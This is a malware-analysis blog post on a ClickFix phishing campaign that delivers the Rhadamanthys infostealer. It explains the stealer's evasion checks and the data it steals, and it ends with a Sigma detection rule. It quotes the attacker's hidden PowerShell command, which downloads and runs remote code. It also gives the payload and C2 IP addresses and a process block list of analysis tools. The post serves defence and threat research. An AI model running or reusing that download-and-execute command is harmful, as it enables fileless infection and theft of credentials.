---
title: "ClickFix Chaos: A Deep Dive into Rhadamanthys Infostealer’s Stealth and Steal Tactics"
date: 2025-07-09 17:36:34 +0200
categories: [Malware Analysis, Threat Intelligence]
tags: [investigation, malware-analysis]
image:
  path: IMG-20250623-WA0018.jpg
  alt: "ClickFix Chaos: A Deep Dive into Rhadamanthys Infostealer’s Stealth and Steal Tactics"
media_subpath: /assets/img/posts/clickfix-chaos-a-deep-dive-into-rhadamanthys-infostealers-stealth-and-steal-tactics
toc: true
---

While hunting for phishing domains, I came across this suspicious domain: **`hxxps://ypp-studio[.]com`**.

It appears to be a **phishing domain**. Let’s conduct a thorough technical analysis to uncover more details and potential indicators of compromise (**IOCs**).

![](1_islFe9f8rCGhH_FimW-oFQ.png)

---

So, let’s see what the Content of this Command is

![](1_fJL7BZa_E6U7sYd9nRnavg.png)

**Enhanced Version:**

```
powershell -w hidden -ep bypass -nop -c “$u=’hxxps://ypp-studio[.]com/update.txt’;iex ((New-Object Net.WebClient).DownloadString($u))
```

**Explanation of Enhancements:**

- `-w hidden`: Hides the PowerShell window (stealthy execution).
- `-ep bypass`: Bypasses the PowerShell execution policy to allow script execution.
- `-nop`: Prevents loading the user’s PowerShell profile (faster, stealthier).
- `-c`: Executes the specified command.
- **Sets `$u`** to a remote URL: `hxxps://ypp-studio[.]com/update.txt`
- Uses `Net.WebClient` to **download** the remote content.
- `Invoke-Expression (iex)` **executes** the downloaded content **in memory**, making it a **fileless attack**.

---

![](image-1024x521.png)

**The Script Contains:** *# 1. Random character padding (obfuscation)*  
 *# 2. A hex-encoded payload that decodes to:*

***Decoded hex string reveals:***  
 **$DecodedURL = “iexhttp://62.60.226.74/PTRFHDGS.msi”  
 $FilePath = $env:AppData + ‘\PTRFHDGS.msi’**

*The script performs these malicious actions:*  
  *1. Downloads malware from: **http://62.60.226.74/PTRFHDGS.msi***  
 *2. Saves it to:* ***%AppData%\PTRFHDGS.msi***   
*3. Executes the malware with: **msiexec.exe /i $FilePath***   
*4. Shows fake “**Verification complete!**” message box to deceive user*

![](image-1-1024x524.png)

---

after pasting the URL `hxxp://62.60.226.74/PTRFHDGS[.]msi` into the browser, an automatic download of the executable file `rh_0.9.0.exe` was triggered without any further user interaction. The browser issued a warning that the file “isn’t commonly downloaded,”

![](image-2.png)
![](image-3-1024x494.png)

---

In a previous investigation, we identified that the URL `http://77.239.96.51/rh_0.9.0.exe` was being used to deliver the **Rhadamanthys Stealer**. However, based on our most recent research, we have observed significant changes in both the malware and its delivery mechanism. The threat actors have updated the dropper, now using the URL `http://62.60.226.74/PTRFHDGS.msi` to distribute the stealer.

**Rhadamanthys** is a highly modular and evolving **information-stealing malware**, first identified in 2022 and continuously developed since. It is sold as Malware-as-a-Service (MaaS) on underground forums and is known for its **advanced evasion techniques**, **multilayer architecture**, and **broad data theft capabilities**.

The malware is designed to harvest **sensitive user data**, including credentials, browser information, cryptocurrency wallets, and system details. Rhadamanthys typically disguises itself as legitimate software — such as MSI installers or cracked tools — and uses **phishing emails**, **typosquatted domains**, and **malicious attachments** to spread.

Each version of Rhadamanthys introduces enhancements in stealth and functionality. For example, version **0.5.0** added process injection modules, while version **0.7.0** integrated **AI-powered capabilities** to extract seed phrases from images—a technique especially dangerous to cryptocurrency users.

# Technical Analysis

## Evasion Technique: Multiple Anti-Analysis

**Multiple Anti-Analysis** is a technique where malware uses **several methods together** to detect and evade analysis environments like: **Virtual Machines (VMs), Debuggers, Sandboxes, Monitoring tools.**

These are well-known processes installed when VMware Tools are running inside a guest OS.

![](1_pjPRxI7mh6U_mzV17MPPbg.png)

Anti-VM

is responsible for gathering detailed system information while implementing anti-virtualization checks.

![](1_AU-iSbo98SlqqzrxcDzc5Q.png)

Anti-VM

![](1_bPQ_MBovM5bm4r_DTNvnHg.png)

Anti-Debugging

This code snippet demonstrates a classic **anti-debugging / anti-patching technique** that checks for **breakpoint instructions (INT 3 = 0xCC)** at runtime.

![](1_wrc5OHgLi8S7KzPOlJUruQ.png)

Anti-Debugging

**Time-based side-channel attack detection** is a technique where malware uses system time or CPU counters to detect artificial delays caused by debugging, virtual machines, or sandboxing. By comparing the time taken between operations, the malware can detect if it’s being analyzed and react by exiting, sleeping, or changing its behavior. This is commonly used in **anti-analysis and evasion techniques**.

![](1_c-T5zGHxFtnVhyDazJdZGA.png)

## Process BlackList

The malware appears to enumerate all active processes and compares their names to a predefined list. If a match is found, it likely indicates that the malware is checking for the presence of specific processes running in the background.

![](1_ODZMFNmXBTi5VXzxJx6bpA.png)

The malware checks the following process names to determine if it is running in the background:

```
ImmunityDebugger.exe      hookexplorer.exe      WinDump.exe        ilspy.exe  
x64dbg.exe                lordpe.exe            x32ddbg.exe        dnspy.exe  
OllyDbg.exe               aoutorunsc.exe        ProcessHacker.exe  idaq64.exe  
resourcehacker.exe        regmon.exe            autoruns.exe       windanr.exe  
dumpcap.exe               procexp.exe           de4dot.exe         Fiddler.exe  
Fiddler Everwhere.exe     procexp64.exe         tcpview.exe        ida.exe  
tcpview64.exe             ida64.exe             Procmon.exe        portmon.exe  
Procmon64.exe             processlasso.exe      Wireshark.exe      vmmap.exe
```

## Take Screenshot

This function captures a dynamic screenshot of a specified window region, allocates memory, and dumps the image into a buffer. The captured images are likely sent to a **command-and-control (C2)** server or stored for batch upload.

![](1_XvkinUmXOOqclKgqxNQMMg.png)

---

Network

The malware sets up a TCP socket using the Winsock API (`socket`, `getsockopt`) with parameters `AF_INET` and `SOCK_STREAM`, confirming intent to establish IPv4-based communication.

![](1_o8YuX4GNb6dQHyLqo2K8tg.png)

The malware uses `getaddrinfo` to resolve its hardcoded C2 server IP address `193.109.85.136`. This is part of its command-and-control communication setup. The usage of raw API and direct IP rather than domain name is an attempt to reduce DNS-based detection.

![](1_W7InHwaP22e_h_xBHitD5A.png)

Data Exfiltration Scope

In the subsequent stages of execution, the malware systematically harvests and exfiltrates a broad range of sensitive data from the infected system. The targeted information includes:

- **System Information**: Hardware identifiers, OS version, user and domain names, and locale settings.
- **Screenshots**: Captures of the desktop to visually monitor user activity.
- **Web Browsers**: {Stored credentials, Cookies, Autofill data, Browsing history}
- **Cryptocurrency Wallets**: Extraction of wallet files and configurations (MetaMask, Electrum).
- **FTP Clients**: Credentials and server addresses.
- **Email Clients**: Login data and configuration details.
- **2FA Applications**: Data from tools like **RoboForm**, **WinAuth**, and **Authy Desktop**.
- **Password Managers**: Particularly **KeePass** vault files or export dumps.
- **VPN Clients**: Stored profiles and authentication tokens.
- **Messaging and VoIP Applications**:
- **Psi+**
- **Pidgin**
- **TOX**
- **Discord**
- **Telegram**
- **Gaming Platforms**: Steam session and credential data.
- **Remote Administration Tools**:
- **TeamViewer**
- **SecureCRT**
- **Sticky Note and Note-taking Apps**:
- **NoteFly**
- **Notezilla**
- **Simple Sticky Notes**

**Conclusion**

The abuse of **ClickFix Captcha** as a delivery mechanism for the **Rhadamanthys Stealer** highlights the evolving tactics of cybercriminals in leveraging legitimate-looking user interaction layers to evade detection. By disguising malicious payloads behind a seemingly benign CAPTCHA gateway, threat actors are effectively bypassing basic security controls and luring victims into executing sophisticated information stealers.

Our analysis of this campaign reveals not only the technical advancements in Rhadamanthys’ delivery infrastructure, but also the broader trend of malware operators using social engineering and trust manipulation to gain initial access. As this threat continues to evolve, defenders must remain vigilant—enhancing user awareness, tightening web filtering, and monitoring for indicators of fileless execution and suspicious outbound traffic.

**Sigma Rule to detect Rhadamanthys Stealer**

```
title: Rhadamanthys Stealer Suspicious Activity
id: f4f83c5b-83a0-44b2-8a67-9a83c9fc72f4
description: Detects suspicious PowerShell execution, LOLBins, and registry access behavior associated with Rhadamanthys Stealer
status: experimental
author: Kh4lifa - DarkAtlas
date: 2025/06/29
logsource:
  category: process_creation
  product: windows
detection:
  selection_ps:
    Image|endswith:
      - powershell.exe
    CommandLine|contains:
      - "-ep Bypass"
      - "Invoke-Expression"
  selection_lolbins:
    CommandLine|contains:
      - "WerFault.exe -u -p"
      - "RegSvcs.exe"
  selection_delivery:
    CommandLine|contains:
      - ".pdf"
      - "blogspot.com"
  selection_registry:
    CommandLine|contains:
      - "HKEY_CURRENT_USER\\Software\\Microsoft\\IdentityCRL\\Immersive\\production\\Token"
      - "HARDWARE\\DESCRIPTION\\System\\SystemBiosVersion"
      - "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings"
  condition: 1 of selection_ps or 1 of selection_lolbins or 1 of selection_delivery or 1 of selection_registry
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
  - attack.t1218
  - attack.credential_access
  - rhadamanthys
```
